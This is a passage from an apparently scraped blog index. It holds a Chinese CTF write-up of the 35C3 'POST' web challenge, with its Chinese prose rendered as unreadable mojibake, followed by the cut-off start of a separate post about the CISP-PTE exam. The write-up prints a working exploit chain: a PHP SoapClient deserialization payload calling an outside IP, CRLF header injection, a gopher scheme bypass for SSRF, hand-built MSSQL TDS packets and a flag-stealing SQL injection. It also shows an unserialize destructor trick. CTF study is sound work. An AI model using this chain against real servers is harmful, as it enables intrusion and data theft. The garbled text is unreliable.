ä¹Ÿå°±æ˜¯è¯´ï¼Œ**MSSQLä¼šè‡ªåŠ¨å°†å…¨è§’unicodeå­—ç¬¦è½¬æ¢ä¸ºASCIIè¡¨ç¤ºå½¢å¼ã€‚**ä¾‹å¦‚ï¼Œå¦‚æœå­—ç¬¦ä¸²åŒ…å«0xEF 0xBC 0x84ï¼Œåˆ™å°†å…¶å­˜å‚¨ä¸º$ã€‚$sâ„®rializedobject$ å…¥åº“åä¼šå˜æˆ $serializedobject$ï¼Œæ³¨æ„å‰è€…çš„ â„® ä¸æ˜¯ ASCII çš„ eï¼Œæ•´ä¸ªå­—ç¬¦ä¸²çš„ 16 è¿›åˆ¶å¦‚ä¸‹ï¼Œå¯è§å‰è€…çš„ â„® çš„ hex æ˜¯ E284AEï¼Œè€Œåè€… e çš„ ASCII æ˜¯ 0x65ã€‚\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§è¿›è¡Œç»•è¿‡ï¼Œå¯ä»¥ç”¨ burp ç›´æ¥ä¿®æ”¹åå…­è¿›åˆ¶æ¥æ“ä½œ\nSoapclient è¿™é‡Œæˆ‘ä»¬ç®€å•è®²ä¸€ä¸‹ soapclient\n â€‹\tpublic SoapClient::SoapClient ( mixed $wsdl [, array $options ] )\nThis constructor creates SoapClient objects in WSDL or non-WSDL mode.\n è¿™æ˜¯ä¸€ä¸ª php çš„å†…éƒ¨ç±»ï¼Œç®€å•æ¥è¯´å°±æ˜¯ç”¨æ¥åˆ›å»º soap æ•°æ®æŠ¥æ–‡ï¼Œä¸ wsdl æ¥å£è¿›è¡Œäº¤äº’çš„ã€‚\n \nå…¶ä¸­__callçš„é­”æœ¯æ–¹æ³•å°±æ¯”è¾ƒæœ‰æ„æ€äº†\n â€‹\tSoapClient::__call\npublic SoapClient::__call ( string $function_name , array $arguments ) : mixed Calling this method directly is deprecated. Usually, SOAP functions can be called as methods of the SoapClientobject; in situations where this is not possible or additional options are needed, use SoapClient::__soapCall().\n å½“ SoapClient å»ºç«‹çš„æ—¶å€™å°±ä¼šè°ƒç”¨è¿™ä¸ªé­”æœ¯æ–¹æ³•ã€‚è€Œä¸”è¿˜æœ‰ä¸€ç‚¹å°ç‰¹æ€§\n â€‹\tå½“è°ƒç”¨ SoapClient ç±»çš„ __call() é­”æœ¯æ–¹æ³•çš„æ—¶å€™ï¼Œä¼šå‘é€ä¸€ä¸ª POST è¯·æ±‚ï¼Œè¯·æ±‚çš„å‚æ•°ç”±ç€ SoapClient ç±»çš„ä¸€äº›å‚æ•°å†³å®šã€‚\n__call() é­”æœ¯æ–¹æ³•ï¼šå½“è°ƒç”¨ä¸€ä¸ªç±»ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶å€™ä¼šè§¦å‘è¿™ä¸ªé­”æœ¯æ–¹æ³•\n æ¯”å¦‚æˆ‘ä»¬ä»¥ä¸‹ä»£ç ï¼š\n\u0026lt;?php $a = new SoapClient(null, array(\u0026#39;location\u0026#39; =\u0026gt; \u0026#34;http://106.14.153.173:2015\u0026#34;,\u0026#39;uri\u0026#39;=\u0026gt; \u0026#34;123\u0026#34;)); $b = serialize($a); echo $b; $c = unserialize($b); $c-\u0026gt;hack(); ?\u0026gt;å½“æˆ‘ä»¬ç›´æ¥è¿è¡Œè¿™æ®µä»£ç çš„æ—¶å€™ï¼Œå°±å› ä¸ºè°ƒç”¨äº†ä¸€ä¸ªSoapClientä¸å­˜åœ¨çš„æ–¹æ³•hack()å¯¼è‡´ç›´æ¥è°ƒç”¨äº†__call()é­”æœ¯æ–¹æ³•\n \nè¯¦ç»†å¯ä»¥å‚è€ƒN1CTF Easy\u0026amp;\u0026amp;Hard Php Writeup\n####Arbitrary Unserialize II\nå¥½çš„ï¼Œæˆ‘ä»¬ç®€å•çš„ä»‹ç»å®Œäº†soapclientï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥æ¯”è¾ƒæ˜æ˜¾çš„çœ‹åˆ°åœ¨ post.php å¤„æœ‰ä¸€å¤„ç±»çš„æ–¹æ³•çš„è°ƒç”¨\nclass Attachment { private $url = NULL; private $za = NULL; private $mime = NULL; public function __construct($url) { $this-\u0026gt;url = $url; $this-\u0026gt;mime = (new finfo)-\u0026gt;file(\u0026#34;../\u0026#34;.$url); if (substr($this-\u0026gt;mime, 0, 11) == \u0026#34;Zip archive\u0026#34;) { $this-\u0026gt;mime = \u0026#34;Zip archive\u0026#34;; $this-\u0026gt;za = new ZipArchive; } } public function __toString() { $str = \u0026#34;\u0026lt;a href=\u0026#39;{$this-\u0026gt;url}\u0026#39;\u0026gt;\u0026#34;.basename($this-\u0026gt;url).\u0026#34;\u0026lt;/a\u0026gt; ($this-\u0026gt;mime\u0026#34;; if (!is_null($this-\u0026gt;za)) { $this-\u0026gt;za-\u0026gt;open(\u0026#34;../\u0026#34;.$this-\u0026gt;url); $str .= \u0026#34;with \u0026#34;.$this-\u0026gt;za-\u0026gt;numFiles . \u0026#34; Files.\u0026#34;; } return $str. \u0026#34;)\u0026#34;; } } å°±æ˜¯åœ¨this-\u0026gt;za-\u0026gt;open()å¤„ï¼Œæˆ‘ä»¬å¯ä»¥å……åˆ†åˆ©ç”¨SoapClientçš„ç‰¹ç‚¹è¿›è¡Œæ„é€ ï¼Œç„¶è€Œæˆ‘ä»¬éœ€è¦è§¦å‘Attachmentè¿™ä¸ªç±»çš„__toString()é­”æœ¯æ–¹æ³•ï¼Œåˆ™éœ€è¦ä¸€ä¸ªechoçš„åœ°æ–¹ï¼Œç„¶åå‘ç°åœ¨ default.php è¿™é‡Œæœ‰æ¯”è¾ƒå¥½çš„åˆ©ç”¨çš„ç‚¹\n\u0026lt;?php include \u0026#39;inc/post.php\u0026#39;; ?\u0026gt;\u0026lt;?php if (isset($_POST[\u0026#34;title\u0026#34;])) { $attachments = array(); if (isset($_FILES[\u0026#34;attach\u0026#34;]) \u0026amp;\u0026amp; is_array($_FILES[\u0026#34;attach\u0026#34;])) { $folder = sha1(random_bytes(10)); mkdir(\u0026#34;../uploads/$folder\u0026#34;); for ($i = 0; $i \u0026lt; count($_FILES[\u0026#34;attach\u0026#34;][\u0026#34;tmp_name\u0026#34;]); $i++) { if ($_FILES[\u0026#34;attach\u0026#34;][\u0026#34;error\u0026#34;][$i] !== 0) continue; $name = basename($_FILES[\u0026#34;attach\u0026#34;][\u0026#34;name\u0026#34;][$i]); move_uploaded_file($_FILES[\u0026#34;attach\u0026#34;][\u0026#34;tmp_name\u0026#34;][$i], \u0026#34;../uploads/$folder/$name\u0026#34;); $attachments[] = new Attachment(\u0026#34;/uploads/$folder/$name\u0026#34;); } } $post = new Post($_POST[\u0026#34;title\u0026#34;], $_POST[\u0026#34;content\u0026#34;], $attachments); $post-\u0026gt;save(); } if (isset($_GET[\u0026#34;action\u0026#34;])) { if ($_GET[\u0026#34;action\u0026#34;] == \u0026#34;restart\u0026#34;) { Post::truncate(); header(\u0026#34;Location: /\u0026#34;); die; } else { ?\u0026gt; \u0026lt;?php } } $posts = Post::loadall(); if (empty($posts)) { echo \u0026#34;\u0026lt;b\u0026gt;You do not have any posts. Create \u0026lt;a href=\\\u0026#34;/?action=create\\\u0026#34;\u0026gt;some\u0026lt;/a\u0026gt;!\u0026lt;/b\u0026gt;\u0026#34;; } else { echo \u0026#34;\u0026lt;b\u0026gt;You have \u0026#34; . count($posts) .\u0026#34; posts. Create \u0026lt;a href=\\\u0026#34;/?action=create\\\u0026#34;\u0026gt;some\u0026lt;/a\u0026gt; more if you want! Or \u0026lt;a href=\\\u0026#34;/?action=restart\\\u0026#34;\u0026gt;restart your blog\u0026lt;/a\u0026gt;.\u0026lt;/b\u0026gt;\u0026#34;; } foreach($posts as $p) { echo $p; echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; } ?\u0026gt; è€Œä¸”åœ¨ post.php ä¸­ï¼Œclass Postè¿˜å­˜åœ¨ä¸€ä¸ªè¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œå…¶ä¸­æŠŠ$attachæ‹¼æ¥åˆ°äº†å­—ç¬¦ä¸²å½“ä¸­ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯å…ˆè°ƒç”¨äº†Postç±»çš„__toStringé­”æœ¯æ–¹æ³•ï¼Œç´§æ¥ç€è°ƒç”¨Attachmentç±»çš„__toStringé­”æœ¯æ–¹æ³•ï¼Œä¹Ÿå°±å¯ä»¥è°ƒç”¨åˆ°äº†$this-\u0026gt;za-\u0026gt;open()çš„æ–¹æ³•ã€‚\npublic function __construct($title, $content, $attachments=\u0026#34;\u0026#34;) { $this-\u0026gt;title = $title; $this-\u0026gt;content = $content; $this-\u0026gt;attachment = $attachments; } public function save() { global $USER; if (is_null($this-\u0026gt;id)) { DB::insert(\u0026#34;INSERT INTO posts (userid, title, content, attachment) VALUES (?,?,?,?)\u0026#34;, array($USER-\u0026gt;uid, $this-\u0026gt;title, $this-\u0026gt;content, $this-\u0026gt;attachment)); } else { DB::query(\u0026#34;UPDATE posts SET title = ?, content = ?, attachment = ? WHERE userid = ? AND id = ?\u0026#34;, array($this-\u0026gt;title, $this-\u0026gt;content, $this-\u0026gt;attachment, $USER-\u0026gt;uid, $this-\u0026gt;id)); } } public function __toString() { $str = \u0026#34;\u0026lt;h2\u0026gt;{$this-\u0026gt;title}\u0026lt;/h2\u0026gt;\u0026#34;; $str .= $this-\u0026gt;content; $str .= \u0026#34;\u0026lt;hr\u0026gt;Attachments:\u0026lt;br\u0026gt;\u0026lt;il\u0026gt;\u0026#34;; foreach ($this-\u0026gt;attachment as $attach) { $str .= \u0026#34;\u0026lt;li\u0026gt;$attach\u0026lt;/li\u0026gt;\u0026#34;; } $str .= \u0026#34;\u0026lt;/il\u0026gt;\u0026#34;; return $str; } è€Œæˆ‘ä»¬çœ‹Post::loadall()ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°\npublic static function load($id) { global $USER; $res = DB::query(\u0026#34;SELECT * FROM posts WHERE userid = ? AND id = ?\u0026#34;, array($USER-\u0026gt;uid, $id)); if (!$res) die(\u0026#34;db error\u0026#34;); $res = $res[0]; $post = new Post($res[\u0026#34;title\u0026#34;], $res[\u0026#34;content\u0026#34;], $res[\u0026#34;attachment\u0026#34;]); $post-\u0026gt;id = $id; return $post; } public static function loadall() { global $USER; $result = array(); $posts = DB::query(\u0026#34;SELECT id FROM posts WHERE userid = ? ORDER BY id DESC\u0026#34;, array($USER-\u0026gt;uid)) ; if (!$posts) return $result; foreach ($posts as $p) { $result[] = Post::load($p[\u0026#34;id\u0026#34;]); } return $result; } loadall()æ–¹æ³•ä¼šé€ä¸ªé€šè¿‡ id è°ƒç”¨load()æ–¹æ³•ï¼Œæ ¹æ®å‰é¢çš„Postæ„é€ æ–¹æ³•ä¸save()æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¿å­˜attachmentçš„æ–¹å¼ã€‚å…¶å®è¿™é‡Œå› ä¸ºechoè¾“å‡ºçš„æ˜¯$post['title']ã€$post['content']ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥æ”¾åœ¨è¿™ä¸¤è€…ä¸­ï¼Œéƒ½ä¼šè§¦å‘__toStringçš„é­”æœ¯æ–¹æ³•\næ‰€ä»¥å¤§æ¦‚çš„æµç¨‹å°±æ˜¯æˆ‘ä»¬é€šè¿‡æ„é€ å¥½ä¸€ä¸ªSoapClientçš„ payload ï¼Œæ’å…¥ä¹‹åè®¿é—® default.php è§¦å‘echoï¼Œè°ƒç”¨$this-\u0026gt;za-\u0026gt;open()ï¼Œæ¥ç€è§¦å‘SoapClientçš„__call()é­”æœ¯å‡½æ•°å®Œæˆä¸€æ¬¡ååºåˆ—åŒ–æ”»å‡»ã€‚\nå› ä¸ºechoç›´æ¥è°ƒç”¨äº†ååºåˆ—åŒ–çš„__toStringé­”æœ¯æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ©ç”¨Attachmentè¿™ä¸ªç±»æ¥æ„é€  payload\nclass Attachment { private $za = NULL; public function __construct() { $this-\u0026gt;za = new SoapClient(null,array(\u0026#39;location\u0026#39;=\u0026gt;\u0026#39;http://106.14.153.173:2015\u0026#39;,\u0026#39;uri\u0026#39;=\u0026gt;\u0026#39;123\u0026#39;)); } } $c=new Attachment(); $aaa=serialize($c); echo $aaa.\u0026#34;\\n\u0026#34;; echo base64_encode($aaa).\u0026#34;\\n\u0026#34;; åˆ©ç”¨ååºåˆ—åŒ–çš„ç‰¹ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å®šä¹‰ç§æœ‰å˜é‡çš„å€¼ï¼Œä½†æ˜¯å­—ç¬¦ä¸²ä¸­ä¼šæœ‰ä¸å¯è§å­—ç¬¦ï¼Œå®éªŒå¦‚ä¸‹\n \næ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”¨base64_encodeè¿›è¡Œç¼–ç ï¼ŒæŠŠç¼–ç å¾—åˆ°çš„å­—ç¬¦ä¸²å†åœ¨ burp é‡Œé¢è¿›è¡Œè§£ç æ„é€ è¯·æ±‚ã€‚\n \nSoapClient SSRF æ ¹æ® hint1 ï¼Œflag åœ¨æ•°æ®åº“é‡Œï¼Œæºç ä¸­å«æœ‰æ•°æ®åº“ä¿¡æ¯ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨SoapClienté€šè¿‡ SSRF æ‰“ MSSQLã€‚è€Œé¢˜ç›®ä¹Ÿç»™æˆ‘ä»¬æä¾›äº† miniProxy.php ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ github ä¸Šå¯ä»¥çœ‹åˆ°ç›¸å…³ä½¿ç”¨è¯´æ˜\n â€‹\tminiProxy should be able to run on any web server with PHP 5.4.7 or later. miniProxy requires PHP\u0026rsquo;s curl and mbstringextensions to be installed.\n å¤§æ¦‚å°±æ˜¯ä¸€ä¸ªå¯ä»¥è®©æˆ‘ä»¬è®¿é—®å†…éƒ¨æœåŠ¡çš„å·¥å…·ã€‚ç„¶åæˆ‘ä»¬æ ¹æ®å¤‡ä»½æ–‡ä»¶ default.backup å¾—åˆ°\nserver { listen 127.0.0.1:8080; access_log /var/log/nginx/proxy.log; if ( $request_method !~ ^(GET)$ ) { return 405; } root /var/www/miniProxy; location / { index index.php; location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.2-fpm.sock; } } } å½“æˆ‘ä»¬è¯·æ±‚ 8080 çš„æ—¶å€™ï¼Œè¯·æ±‚çš„æ˜¯ miniProxyï¼Œä½†æ˜¯åªèƒ½ç”¨ GET è¯·æ±‚ï¼Œè€Œæˆ‘ä»¬ä¹‹å‰å¯ä»¥å‘ç°SoapClientåªèƒ½å‘ POST è¯·æ±‚\n \nè¿™é‡Œå¤§æ¦‚æ€è·¯ä¹Ÿæ¯”è¾ƒæ¸…æ™°äº†ï¼Œå°±æ˜¯åˆ©ç”¨ miniProxy ä½¿ç”¨ gopher åè®®å»è®¿é—® mssql æ•°æ®åº“æ‹¿åˆ° flag ï¼Œä½†æ˜¯æ€ä¹ˆå¤„ç†è®©SoapClientå‘é€ GET è¯·æ±‚å‘¢ï¼Ÿ\n####SoapClient CRLF injection\nå‘é€ GET è¯·æ±‚æˆ‘ä»¬å°±ä¸å¾—ä¸åˆç”¨åˆ°SoapClientçš„å¦ä¸€ä¸ªé€‰é¡¹\n options\nAn array of options. If working in WSDL mode, this parameter is optional. If working in non-WSDL mode, the location and uri options must be set, where location is the URL of the SOAP server to send the request to, and uri is the target namespace of the SOAP service.\n\u0026hellip;\nThe user_agent option specifies string to use in User-Agent header.\n è€Œä¸”åœ¨ header é‡Œ User-Agent åœ¨ Content-Type å‰é¢ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ CRLF è¿›è¡Œåˆ†éš”è¯·æ±‚ï¼Œæ„é€  GET è¯·æ±‚ã€‚\n \nminiProxy URL scheme bypass æˆ‘ä»¬è‡ªå·±æœ¬åœ°çœ‹çœ‹ MiniProxy æ€ä¹ˆç”¨ã€‚\n \néšä¾¿æµ‹ä¸€ä¸ªfile:///etc/passwdï¼Œè¿”å›\nError: Detected a \u0026quot;file\u0026quot; URL. miniProxy exclusively supports http[s] URLs. ç„¶åæˆ‘ä»¬å®šä½åˆ°ä»£ç åŒº\n$scheme = parse_url($url, PHP_URL_SCHEME); if (empty($scheme)) { //Assume that any supplied URLs starting with // are HTTP URLs.  if (strpos($url, \u0026#34;//\u0026#34;) === 0) { $url = \u0026#34;http:\u0026#34; . $url; } } else if (!preg_match(\u0026#34;/^https?$/i\u0026#34;, $scheme)) { die(\u0026#39;Error: Detected a \u0026#34;\u0026#39; . $scheme . \u0026#39;\u0026#34; URL. miniProxy exclusively supports http[s] URLs.\u0026#39;); } å‘ç°æ˜¯è¿™ä¸ªåœ°æ–¹æœ‰ä¸ªæ­£åˆ™åˆ¤æ–­ï¼Œå¼€å¤´å¿…é¡»ä»¥httpsæˆ–è€…httpï¼Œç„¶è€Œæˆ‘ä»¬éœ€è¦ç”¨åˆ° gopher åè®®ï¼Œå°±éœ€è¦ç»•è¿‡è¿™é‡Œã€‚è¿™é‡Œä¹Ÿå°±éœ€è¦ä¸€ä¸ªå° trick äº†\n$scheme = parse_url($url, PHP_URL_SCHEME);\t// é‡åˆ° gopher:/// æ—¶ä¼šè§£æå¤±è´¥ï¼Œè¿”å›false empty($scheme)\t// empty(false) ä¸º true è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨gopher:///ç»•è¿‡dieçš„é™åˆ¶æ‰§è¡Œä¸‹é¢çš„ $response = makeRequest($url); è¯·æ±‚å‡½æ•°äº†ã€‚\nè¿™é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€ä¸ª 301 è¿›è¡Œè·³è½¬ã€‚\nConnect to MSSQL via gopher æ€ä¹ˆæ„é€ gopheråŒ…å‘¢ï¼Œè¿™æ˜¯ä¸ªæ¯”è¾ƒéº»çƒ¦çš„äº‹ï¼Œä¹‹å‰åœ¨å¦å¤–ä¸€ä¸ªæ¯”èµ›ä¸Šç”¨ tcpdump æŠ“è‡ªå·±çš„ mysql çš„æ•°æ®åŒ…ç„¶åè¿›è¡Œ gopher ï¼Œè¿™é‡Œä¹Ÿæ˜¯ç±»ä¼¼çš„ã€‚è¿™é‡Œå°±ä¸å†åšäº†ï¼Œç›´æ¥æ‹¿å®˜æ–¹ç»™çš„ exp çœ‹çœ‹å§ã€‚\n// the prelogin and login packets can either be assembled // by hand if you are into that kind of stuff. // or you can just use wireshark :) $prelogin_packet = \u0026#34;\\x12\\x01\\x00\\x2f\\x00\\x00\\x01\\x00\u0026#34;; $prelogin_packet .= \u0026#34;\\x00\\x00\\x1a\\x00\\x06\\x01\\x00\\x20\u0026#34;; $prelogin_packet .= \u0026#34;\\x00\\x01\\x02\\x00\\x21\\x00\\x01\\x03\u0026#34;; $prelogin_packet .= \u0026#34;\\x00\\x22\\x00\\x04\\x04\\x00\\x26\\x00\u0026#34;; $prelogin_packet .= \u0026#34;\\x01\\xff\\x00\\x00\\x00\\x01\\x00\\x01\u0026#34;; $prelogin_packet .= \u0026#34;\\x02\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34;; $login_packet = \u0026#34;\\x10\\x01\\x00\\xde\\x00\\x00\\x01\\x00\u0026#34;; $login_packet .= \u0026#34;\\xd6\\x00\\x00\\x00\\x04\\x00\\x00\\x74\u0026#34;; $login_packet .= \u0026#34;\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34;; $login_packet .= \u0026#34;\\x54\\x30\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34;; $login_packet .= \u0026#34;\\xe0\\x00\\x00\\x08\\xc4\\xff\\xff\\xff\u0026#34;; $login_packet .= \u0026#34;\\x09\\x04\\x00\\x00\\x5e\\x00\\x07\\x00\u0026#34;; $login_packet .= \u0026#34;\\x6c\\x00\\x0a\\x00\\x80\\x00\\x08\\x00\u0026#34;; $login_packet .= \u0026#34;\\x90\\x00\\x0a\\x00\\xa4\\x00\\x09\\x00\u0026#34;; $login_packet .= \u0026#34;\\xb6\\x00\\x00\\x00\\xb6\\x00\\x07\\x00\u0026#34;; $login_packet .= \u0026#34;\\xc4\\x00\\x00\\x00\\xc4\\x00\\x09\\x00\u0026#34;; $login_packet .= \u0026#34;\\x01\\x02\\x03\\x04\\x05\\x06\\xd6\\x00\u0026#34;; $login_packet .= \u0026#34;\\x00\\x00\\xd6\\x00\\x00\\x00\\xd6\\x00\u0026#34;; $login_packet .= \u0026#34;\\x00\\x00\\x00\\x00\\x00\\x00\\x61\\x00\u0026#34;; $login_packet .= \u0026#34;\\x77\\x00\\x65\\x00\\x73\\x00\\x6f\\x00\u0026#34;; $login_packet .= \u0026#34;\\x6d\\x00\\x65\\x00\\x63\\x00\\x68\\x00\u0026#34;; $login_packet .= \u0026#34;\\x61\\x00\\x6c\\x00\\x6c\\x00\\x65\\x00\u0026#34;; $login_packet .= \u0026#34;\\x6e\\x00\\x67\\x00\\x65\\x00\\x72\\x00\u0026#34;; $login_packet .= \u0026#34;\\xc1\\xa5\\x53\\xa5\\x53\\xa5\\x83\\xa5\u0026#34;; $login_packet .= \u0026#34;\\xb3\\xa5\\x82\\xa5\\xb6\\xa5\\xb7\\xa5\u0026#34;; $login_packet .= \u0026#34;\\x6e\\x00\\x6f\\x00\\x64\\x00\\x65\\x00\u0026#34;; $login_packet .= \u0026#34;\\x2d\\x00\\x6d\\x00\\x73\\x00\\x73\\x00\u0026#34;; $login_packet .= \u0026#34;\\x71\\x00\\x6c\\x00\\x6c\\x00\\x6f\\x00\u0026#34;; $login_packet .= \u0026#34;\\x63\\x00\\x61\\x00\\x6c\\x00\\x68\\x00\u0026#34;; $login_packet .= \u0026#34;\\x6f\\x00\\x73\\x00\\x74\\x00\\x54\\x00\u0026#34;; $login_packet .= \u0026#34;\\x65\\x00\\x64\\x00\\x69\\x00\\x6f\\x00\u0026#34;; $login_packet .= \u0026#34;\\x75\\x00\\x73\\x00\\x63\\x00\\x68\\x00\u0026#34;; $login_packet .= \u0026#34;\\x61\\x00\\x6c\\x00\\x6c\\x00\\x65\\x00\u0026#34;; $login_packet .= \u0026#34;\\x6e\\x00\\x67\\x00\\x65\\x00\u0026#34;; // need to add a ;-- - to execute the query successfully, // because gopher adds a \\x0d\\x0a to the end of the request // and for some reaason the query does not execute if we don\u0026#39;t // comment that out $query = $argv[1] . \u0026#34;;-- -\u0026#34;; $query = mb_convert_encoding($query, \u0026#34;utf-16le\u0026#34;); // the length of the packet is the length of the query + // the length of the header (30 bytes) + the \\x0d\\x0a added // by gopher protocol $length = strlen($query) + 30 + 2; $query_packet = \u0026#34;\\x01\\x01\u0026#34; . pack(\u0026#34;n\u0026#34;, $length) . \u0026#34;\\x00\\x00\\x01\\x00\u0026#34;; $query_packet .= \u0026#34;\\x16\\x00\\x00\\x00\\x12\\x00\\x00\\x00\u0026#34;; $query_packet .= \u0026#34;\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34;; $query_packet .= \u0026#34;\\x00\\x00\\x01\\x00\\x00\\x00\u0026#34;; $query_packet .= $query; $payload = $prelogin_packet . $login_packet . $query_packet; å¯ä»¥çœ‹åˆ°è¿™é‡Œéœ€è¦åŠ å…¥ä¸€ä¸ª;-- -ï¼Œæ˜¯ä¸ºäº†æ³¨é‡Šæ‰\\x0a\\x0aï¼Œè¿™æ˜¯ gopher è‡ªåŠ¨æ·»åŠ çš„å†…å®¹ï¼Œä¸ç„¶ query æ— æ³•æˆåŠŸæ‰§è¡Œã€‚\nGet Flag åŸºæœ¬çš„åˆ©ç”¨ç‚¹éƒ½åˆ†æå®Œäº†ï¼Œæœ€åè¿™é“é¢˜è¿˜æ¯”è¾ƒè‰¯å¿ƒåœ°åœ¨ bootstrap.php ä¸­è®¾ç½®äº†\nif (isset($_SERVER[\u0026#34;HTTP_DEBUG\u0026#34;])) var_dump($USER); å¯ä»¥çœ‹åˆ°è‡ªå·±çš„ UID\nè¿™ä¸ªå¯ä»¥ç”¨æ¥å¹²å˜›å‘¢ï¼Ÿå½“ç„¶æ˜¯ç”¨æ¥æ³¨å…¥äº†å•¦ï¼Œç›´æ¥åœ¨è‡ªå·±çš„ post ä¸­è·å–ç›¸å…³çš„ä¿¡æ¯\ninsert into posts (userid, title, content, attachment) values ({}, \u0026quot;foobar\u0026quot;, (select flag from flag.flag), \u0026quot;foobar\u0026quot;);  \n \nConclusion æ•´ä¸ªå¤ç°å®Œè¿˜æ˜¯æ„Ÿè§‰æ¯”è¾ƒæœ‰éš¾åº¦çš„ï¼Œç‰¹åˆ«æ˜¯æ•´ä¸ªæ„é€ é“¾éƒ½æ¯”è¾ƒæœ‰æ„æ€ã€‚é€šè¿‡SoapClientååºåˆ—åŒ–åˆ° gopher SSRF åˆ° CRLF å†åˆ° Get Flagï¼Œæ•´ä¸ªæµç¨‹éœ€è¦çš„æŠ€å·§ä»¥åŠå¯¹è‡ªå·±çš„èƒ½åŠ›è¦æ±‚æ¯”è¾ƒé«˜ï¼Œæ•´ä½“ä¸‹æ¥å­¦ä¹ äº†ä¸å°‘ã€‚ä¸»è¦éƒ½æ˜¯ä¸SoapClientç›¸å…³ï¼Œè¿˜æ˜¯æ¯”è¾ƒ Nice çš„é¢˜ç›®ï¼Œä¹Ÿé‡æ–°è®¤è¯†äº†ååºåˆ—åŒ–æ¼æ´ã€‚æ•´ä½“éƒ½æ¯”è¾ƒèµã€‚\nphp â€” Bonus Description  â€‹\tPHP\u0026rsquo;s unserialization mechanism can be exceptional.\n ç»™ä¸ª bonus å§ï¼Œä¹Ÿç®—æ˜¯ä¸€é“ç®€å•çš„åºåˆ—åŒ–é¢˜ç›®\n\u0026lt;?php $line = trim(fgets(STDIN)); $flag = file_get_contents(\u0026#39;/flag\u0026#39;); class B { function __destruct() { global $flag; echo $flag; } } $a = @unserialize($line); throw new Exception(\u0026#39;Well that was unexpectedâ€¦\u0026#39;); echo $a; ?\u0026gt;Hacking Php æ­£å¸¸çš„ç±»è°ƒç”¨ææ„å‡½æ•°ä¸€èˆ¬ä¼šåœ¨è„šæœ¬ç»“æŸçš„æ—¶å€™ï¼Œç„¶è€Œè¿™é‡Œè¦æƒ³æ‹¿åˆ° flag ï¼Œå°±éœ€è¦è°ƒç”¨ææ„å‡½æ•°ã€‚ç„¶è€Œunserializeæ­£å¸¸è§£æç±»çš„æ—¶å€™ä¸ä¼šè°ƒç”¨ææ„å‡½æ•°ï¼Œä½†æ˜¯å½“è§£æå‡ºé”™çš„æ—¶å€™ï¼Œå¦‚æœç±»åæ˜¯æ­£ç¡®çš„ï¼Œå°±ä¼šè°ƒç”¨è¿™ä¸ªç±»çš„ææ„å‡½æ•°ï¼Œæ¯”å¦‚æ­£å¸¸åºåˆ—åŒ–å‡ºæ¥çš„ç±»æ˜¯è¿™æ ·çš„O:1:\u0026quot;B\u0026quot;:0:{}ï¼Œåªè¦æˆ‘ä»¬è®©ä»–è§£æå‡ºé”™å°±å¯ä»¥è°ƒç”¨ææ„å‡½æ•°äº†ï¼Œæ‰€ä»¥ä»¥ä¸‹éšä¾¿ç”¨ä¸€ä¸ªå°±å¥½äº†\nO:1:\u0026#34;B\u0026#34;:0:{ O:1:\u0026#34;B\u0026#34;:1:{} ","date":"2019-03-23T00:29:30Z","permalink":"https://blog.zeddyu.info/2019/03/23/35c3-POST%E5%A4%8D%E7%9B%98%E8%AE%B0%E5%BD%95/","title":"35c3 POSTå¤ç›˜è®°å½•"},{"content":"å‰äº›é˜µå­æœ‰ä¸ªæ´»åŠ¨é€äº†æˆ‘ CISP çš„è€ƒè¯•åˆ¸ï¼Œä»Šå¤©å»è€ƒäº† CISP-PTE è®¤è¯ï¼Œè¶è‡ªå·±å°è±¡è¿˜æ¯”è¾ƒæ·±å†™ä¸€ä¸‹\nCISP-PTE ä»‹ç» What is CISP {% colorquote info @Baidu https://baike.baidu.com/item/CISP/1438639?fr=aladdin %}\nCISPå³â€œæ³¨å†Œä¿¡æ¯å®‰å…¨ä¸“ä¸šäººå‘˜â€ï¼Œç³»å›½å®¶å¯¹ä¿¡æ¯å®‰å…¨äººå‘˜èµ„è´¨çš„æœ€é«˜è®¤å¯ã€‚è‹±æ–‡ä¸º Certified Information Security Professional (ç®€ç§°CISP)ï¼ŒCISPç³»ç»ä¸­å›½ä¿¡æ¯å®‰å…¨äº§å“æµ‹è¯„è®¤è¯ä¸­å¿ƒï¼ˆå·²æ”¹åä¸­å›½ä¿¡æ¯å®‰å…¨æµ‹è¯„ä¸­å¿ƒï¼‰å®æ–½å›½å®¶è®¤è¯ã€‚CISPæ˜¯å¼ºåˆ¶åŸ¹è®­çš„ã€‚å¦‚æœæƒ³å‚åŠ CISPè€ƒè¯•ï¼Œå¿…é¡»è¦æ±‚å‡ºå…·æˆæƒåŸ¹è®­æœºæ„çš„åŸ¹è®­åˆæ ¼è¯æ˜ã€‚\n{% endcolorquote %}\nå†æ¥çœ‹ä¸€ä¸‹åŒºåˆ«ï¼š\n{% blockquote http://www.edufly.cn/cisp/7891.html 